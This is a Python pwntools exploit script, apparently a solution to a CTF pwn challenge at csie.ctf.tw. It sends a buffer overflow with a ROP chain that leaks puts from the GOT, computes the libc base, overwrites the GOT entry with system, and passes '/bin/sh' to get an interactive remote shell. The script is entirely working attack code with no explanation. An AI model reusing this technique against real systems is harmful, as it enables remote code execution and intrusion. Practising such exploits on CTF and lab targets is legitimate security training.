#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'
r = remote('csie.ctf.tw', 10131)

puts_plt = 0x4004e0
puts_got = 0x601018
pop_rdi = 0x4006f3
gets_plt = 0x400510
rop = flat([pop_rdi, puts_got, puts_plt, pop_rdi, puts_got, gets_plt, pop_rdi, (puts_got+8), puts_plt])

payload = 'A'*0x28

r.sendline(payload + rop)

r.recvuntil('\n')

puts_addr = u64(r.recvuntil('\n').strip().ljust(8,'\x00'))
libc_base = puts_addr - 0x6f690
system = libc_base + 0x45390

print "libc:", hex(libc_base)


r.sendline(p64(system)+"/bin/sh\x00")

r.interactive()
